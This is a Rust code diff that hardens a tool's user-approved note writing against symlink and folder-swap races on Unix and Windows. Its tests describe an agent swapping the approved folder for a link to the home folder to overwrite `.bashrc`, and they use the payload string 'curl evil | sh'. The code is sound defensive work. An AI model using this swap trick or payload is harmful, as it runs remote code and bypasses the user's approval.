@@ -3,10 +3,14 @@
 //! only after the user allows them in scrpad (see `Session::allow`). Nothing here ever puts a
 //! note's text in an error message: an agent reads those.
 
+use std::ffi::OsStr;
 use std::io::Write as _;
 use std::path::{Path, PathBuf};
 
+#[cfg(windows)]
 use crate::store::{create_unique_temp, sync_parent};
+#[cfg(unix)]
+use crate::store::{ignore_unsupported_sync, temp_name};
 
 /// The longest file name most file systems take, in bytes.
 const MAX_NAME: usize = 255;
@@ -25,11 +29,14 @@ pub fn check_file_name(title: &str) -> Result<(), String> {
 }
 
 /// Where `--write` would put a note, as the dialog shows it.
-#[derive(Clone, Debug, PartialEq, Eq)]
+#[derive(Debug)]
 pub struct Target {
     pub path: PathBuf,
     /// A file is there already: the dialog asks to replace it.
     pub exists: bool,
+    /// The folder of `path`, opened when asked: the note goes into this folder, never into
+    /// another one put at its path while the dialog was open.
+    folder: Folder,
 }
 
 /// `dir/title`, if scrpad may write it: `dir` an existing absolute folder, and the name free or a
@@ -41,45 +48,148 @@ pub fn target(dir: &Path, title: &str) -> Result<Target, String> {
         return Err(format!("{} is not an absolute path", dir.display()));
     }
     let not_a_folder = || format!("{} is not a folder", dir.display());
+    let folder = Folder::open(dir).map_err(|_| not_a_folder())?;
     let dir = std::fs::canonicalize(dir).map_err(|_| not_a_folder())?;
-    if !std::fs::metadata(&dir).is_ok_and(|m| m.is_dir()) {
-        return Err(not_a_folder());
+    // A link in `dir` changed between the two: the path shown would not be the folder opened.
+    if !folder.is_at(&dir) {
+        return Err(format!("{} changed while scrpad looked at it", dir.display()));
     }
     let path = dir.join(title);
     match std::fs::symlink_metadata(&path) {
-        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Target { path, exists: false }),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Target { path, exists: false, folder }),
         Err(e) => Err(format!("{}: {e}", path.display())),
         Ok(m) if m.file_type().is_symlink() => Err(format!("{} is a link; scrpad does not write through links", path.display())),
-        Ok(m) if m.is_file() => Ok(Target { path, exists: true }),
+        Ok(m) if m.is_file() => Ok(Target { path, exists: true, folder }),
         Ok(_) => Err(format!("{} is not a file", path.display())),
     }
 }
 
-/// Writes `text` (with a final newline) to `path`, private to the user and atomically: a temp
-/// file next to it, then a rename. A rename replaces a link put there since `target`; it never
-/// follows it. Without `replace`, a hard link puts the file in place only if nothing is there.
-pub fn write(path: &Path, text: &str, replace: bool) -> Result<(), String> {
-    let fail = |e: std::io::Error| format!("could not write {}: {e}", path.display());
-    let mut tmp = create_unique_temp(path).map_err(fail)?;
-    tmp.file_mut().write_all(text.as_bytes()).map_err(fail)?;
+/// Writes `text` (with a final newline) where `target` says, private to the user and atomically:
+/// a temp file next to it, then a rename. Into the folder opened by `target`, and only while the
+/// path the dialog showed still leads to it: a folder moved away, or a link put in the path since,
+/// is refused, never followed. A rename replaces a link put at the file itself; it never follows
+/// it. When `target` found no file, a hard link puts the file in place only if nothing is there.
+pub fn write(target: &Target, text: &str) -> Result<(), String> {
+    let path = &target.path;
+    let (Some(dir), Some(name)) = (path.parent(), path.file_name()) else {
+        unreachable!("target() joins a file name to a folder");
+    };
+    if !target.folder.is_at(dir) {
+        return Err(format!("{} is not the folder scrpad asked about any more; ask again", dir.display()));
+    }
+    let mut text = text.to_owned();
     if !text.ends_with('\n') {
-        tmp.file_mut().write_all(b"\n").map_err(fail)?;
+        text.push('\n');
     }
-    tmp.file_mut().sync_all().map_err(fail)?;
-    tmp.close();
-    if replace {
-        std::fs::rename(tmp.path(), path).map_err(fail)?;
-        tmp.persisted();
-    } else {
-        match std::fs::hard_link(tmp.path(), path) {
-            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
-                return Err(format!("{} exists now; ask again to replace it", path.display()));
-            }
-            result => result.map_err(fail)?,
+    match target.folder.put(name, text.as_bytes(), target.exists) {
+        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists && !target.exists => {
+            Err(format!("{} exists now; ask again to replace it", path.display()))
         }
-        // `tmp` removes its own name when dropped; the file stays under `path`.
+        result => result.map_err(|e| format!("could not write {}: {e}", path.display())),
     }
-    sync_parent(path).map_err(fail)
+}
+
+/// An open folder that `--write` puts a file in.
+#[cfg(unix)]
+#[derive(Debug)]
+struct Folder(std::fs::File);
+
+#[cfg(unix)]
+impl Folder {
+    /// Opens `dir`, following links; only a folder opens (a FIFO would block a plain open).
+    fn open(dir: &Path) -> std::io::Result<Folder> {
+        use rustix::fs::{Mode, OFlags};
+        let fd = rustix::fs::open(dir, OFlags::RDONLY | OFlags::DIRECTORY | OFlags::CLOEXEC, Mode::empty())?;
+        Ok(Folder(fd.into()))
+    }
+
+    /// `path` leads to this folder now: the same device and inode.
+    fn is_at(&self, path: &Path) -> bool {
+        use std::os::unix::fs::MetadataExt;
+        match (self.0.metadata(), std::fs::metadata(path)) {
+            (Ok(held), Ok(now)) => (held.dev(), held.ino()) == (now.dev(), now.ino()),
+            _ => false,
+        }
+    }
+
+    /// Puts `bytes` in a new private file `name` in this folder, by the open folder and never by
+    /// path: a temp file, then a rename over `name` (`replace`) or a hard link that fails if
+    /// `name` exists.
+    fn put(&self, name: &OsStr, bytes: &[u8], replace: bool) -> std::io::Result<()> {
+        use rustix::fs::{AtFlags, Mode, OFlags};
+        let flags = OFlags::WRONLY | OFlags::CREATE | OFlags::EXCL | OFlags::NOFOLLOW | OFlags::CLOEXEC;
+        let (tmp, file) = loop {
+            let tmp = temp_name(name);
+            match rustix::fs::openat(&self.0, &tmp, flags, Mode::RUSR | Mode::WUSR) {
+                Ok(fd) => break (tmp, std::fs::File::from(fd)),
+                Err(rustix::io::Errno::EXIST) => continue,
+                Err(e) => return Err(e.into()),
+            }
+        };
+        let result = (|| {
+            let mut file = file;
+            file.write_all(bytes)?;
+            file.sync_all()?;
+            drop(file);
+            if replace {
+                rustix::fs::renameat(&self.0, &tmp, &self.0, name)?;
+            } else {
+                rustix::fs::linkat(&self.0, &tmp, &self.0, name, AtFlags::empty())?;
+            }
+            Ok::<_, std::io::Error>(())
+        })();
+        // After a rename the temp name is gone; otherwise it goes now, the file stays as `name`.
+        if result.is_err() || !replace {
+            let _ = rustix::fs::unlinkat(&self.0, &tmp, AtFlags::empty());
+        }
+        result?;
+        ignore_unsupported_sync(self.0.sync_all())
+    }
+}
+
+/// An open folder that `--write` puts a file in. Opened without delete sharing, so neither it nor
+/// a folder above it can be renamed or replaced by a junction while the dialog is open.
+#[cfg(windows)]
+#[derive(Debug)]
+struct Folder {
+    _handle: std::fs::File,
+    /// Where it was when opened, links resolved.
+    at: PathBuf,
+}
+
+#[cfg(windows)]
+impl Folder {
+    fn open(dir: &Path) -> std::io::Result<Folder> {
+        use std::os::windows::fs::OpenOptionsExt;
+        // FILE_SHARE_READ | FILE_SHARE_WRITE, not FILE_SHARE_DELETE; FILE_FLAG_BACKUP_SEMANTICS
+        // opens a folder.
+        let handle = std::fs::OpenOptions::new().read(true).share_mode(0x1 | 0x2).custom_flags(0x0200_0000).open(dir)?;
+        if !handle.metadata()?.is_dir() {
+            return Err(std::io::ErrorKind::NotADirectory.into());
+        }
+        Ok(Folder { _handle: handle, at: std::fs::canonicalize(dir)? })
+    }
+
+    fn is_at(&self, path: &Path) -> bool {
+        std::fs::canonicalize(path).is_ok_and(|now| now == self.at)
+    }
+
+    /// By path, which the open handle keeps leading here.
+    fn put(&self, name: &OsStr, bytes: &[u8], replace: bool) -> std::io::Result<()> {
+        let path = self.at.join(name);
+        let mut tmp = create_unique_temp(&path)?;
+        tmp.file_mut().write_all(bytes)?;
+        tmp.file_mut().sync_all()?;
+        tmp.close();
+        if replace {
+            std::fs::rename(tmp.path(), &path)?;
+            tmp.persisted();
+        } else {
+            std::fs::hard_link(tmp.path(), &path)?;
+            // `tmp` removes its own name when dropped; the file stays under `path`.
+        }
+        sync_parent(&path)
+    }
 }
 
 /// The most of a command line the dialog shows, in bytes; the rest is counted, not shown.
@@ -249,11 +359,13 @@ mod tests {
     fn writing_is_private_atomic_and_replaces_only_when_told() {
         let dir = temp_dir("write");
         let path = dir.join(".env");
-        write(&path, "A=1", false).unwrap();
+        let asked = target(&dir, ".env").unwrap();
+        write(&asked, "A=1").unwrap();
         assert_eq!(std::fs::read_to_string(&path).unwrap(), "A=1\n", "a final newline is added");
-        assert!(write(&path, "A=2", false).unwrap_err().contains("exists"));
+        // Asked when nothing was there: a file put there since is not replaced.
+        assert!(write(&asked, "A=2").unwrap_err().contains("exists"));
         assert_eq!(std::fs::read_to_string(&path).unwrap(), "A=1\n");
-        write(&path, "A=2\n", true).unwrap();
+        write(&target(&dir, ".env").unwrap(), "A=2\n").unwrap();
         assert_eq!(std::fs::read_to_string(&path).unwrap(), "A=2\n");
         #[cfg(unix)]
         {
@@ -272,14 +384,66 @@ mod tests {
         let victim = dir.join("victim");
         std::fs::write(&victim, "keep me").unwrap();
         let path = dir.join(".env");
-        let t = target(&dir, ".env").unwrap();
+        let asked_new = target(&dir, ".env").unwrap();
+        std::fs::write(&path, "OLD=1\n").unwrap();
+        let asked_replace = target(&dir, ".env").unwrap();
+        std::fs::remove_file(&path).unwrap();
         std::os::unix::fs::symlink(&victim, &path).unwrap();
         // Not replacing: the link counts as an existing entry.
-        assert!(write(&t.path, "S=1", false).is_err());
+        assert!(write(&asked_new, "S=1").is_err());
         // Replacing: the link itself is replaced, its target untouched.
-        write(&t.path, "S=1", true).unwrap();
+        write(&asked_replace, "S=1").unwrap();
         assert_eq!(std::fs::read_to_string(&victim).unwrap(), "keep me");
         assert!(!std::fs::symlink_metadata(&path).unwrap().file_type().is_symlink());
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    /// The attack in the security review: the dialog shows `proj/out/.bashrc`; while it is open
+    /// the agent moves `out` away and links `out` to the home folder.
+    #[cfg(unix)]
+    #[test]
+    fn a_folder_swapped_after_the_dialog_is_never_written() {
+        let dir = temp_dir("swap");
+        let (out, home) = (dir.join("out"), dir.join("home"));
+        std::fs::create_dir(&out).unwrap();
+        std::fs::create_dir(&home).unwrap();
+        std::fs::write(home.join(".bashrc"), "keep me").unwrap();
+        std::fs::write(out.join(".bashrc"), "placeholder").unwrap();
+        let asked = target(&out, ".bashrc").unwrap();
+        assert!(asked.exists);
+        std::fs::rename(&out, dir.join("out.x")).unwrap();
+        std::os::unix::fs::symlink(&home, &out).unwrap();
+        assert!(write(&asked, "curl evil | sh").unwrap_err().contains("ask again"));
+        assert_eq!(std::fs::read_to_string(home.join(".bashrc")).unwrap(), "keep me");
+        assert_eq!(std::fs::read_to_string(dir.join("out.x/.bashrc")).unwrap(), "placeholder");
+        // Moved away and nothing put in its place: refused too, not written where it went.
+        std::fs::remove_file(&out).unwrap();
+        let asked = target(&dir.join("out.x"), ".bashrc").unwrap();
+        std::fs::rename(dir.join("out.x"), &out).unwrap();
+        assert!(write(&asked, "A=1").is_err());
+        assert_eq!(std::fs::read_to_string(out.join(".bashrc")).unwrap(), "placeholder");
+        // A folder higher up swapped the same way.
+        let deep = dir.join("a/b");
+        std::fs::create_dir_all(&deep).unwrap();
+        std::fs::create_dir(home.join("b")).unwrap();
+        let asked = target(&deep, ".env").unwrap();
+        std::fs::rename(dir.join("a"), dir.join("a.x")).unwrap();
+        std::os::unix::fs::symlink(&home, dir.join("a")).unwrap();
+        assert!(write(&asked, "A=1").is_err());
+        assert!(!home.join("b/.env").exists());
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn only_a_folder_opens_as_one() {
+        let dir = temp_dir("fifo");
+        let fifo = dir.join("fifo");
+        assert!(std::process::Command::new("mkfifo").arg(&fifo).status().unwrap().success());
+        // Would block forever if opened as a file.
+        assert!(target(&fifo, ".env").unwrap_err().contains("not a folder"));
+        std::fs::write(dir.join("file"), "").unwrap();
+        assert!(target(&dir.join("file"), ".env").unwrap_err().contains("not a folder"));
         let _ = std::fs::remove_dir_all(dir);
     }
 
